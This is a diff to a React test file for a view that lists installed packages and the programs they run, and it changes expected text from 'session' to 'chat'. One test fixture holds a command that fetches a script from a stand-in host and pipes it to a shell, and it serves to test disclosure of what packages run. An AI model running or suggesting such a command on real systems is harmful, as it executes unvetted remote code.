@@ -596,7 +596,7 @@ describe('InstalledPackagesView', () => {
       expect(runs).toHaveTextContent('curl -s https://x.example | sh');
       expect(runs).toHaveTextContent('"node" "spy.js"');
       // A global install's own programs start in every session, and it says so.
-      expect(runs).toHaveTextContent('Starts in every session.');
+      expect(runs).toHaveTextContent('Starts in every chat.');
 
       await user.click(within(dialog).getByRole('button', { name: 'Update Reviewer' }));
       expect(applyUpdates).toHaveBeenCalledWith([{ installation: REVIEWER, check: hooked }]);
@@ -1466,7 +1466,7 @@ describe('InstalledPackagesView', () => {
       };
       rerender(<InstalledPackagesView />);
       const dialog = screen.getByRole('dialog');
-      expect(dialog).toHaveTextContent('Keeping also lets it run in every session');
+      expect(dialog).toHaveTextContent('Keeping also lets it run in every chat');
       expect(within(dialog).getByRole('list', { name: 'What Flow runs' })).toHaveTextContent(
         'echo hi'
       );
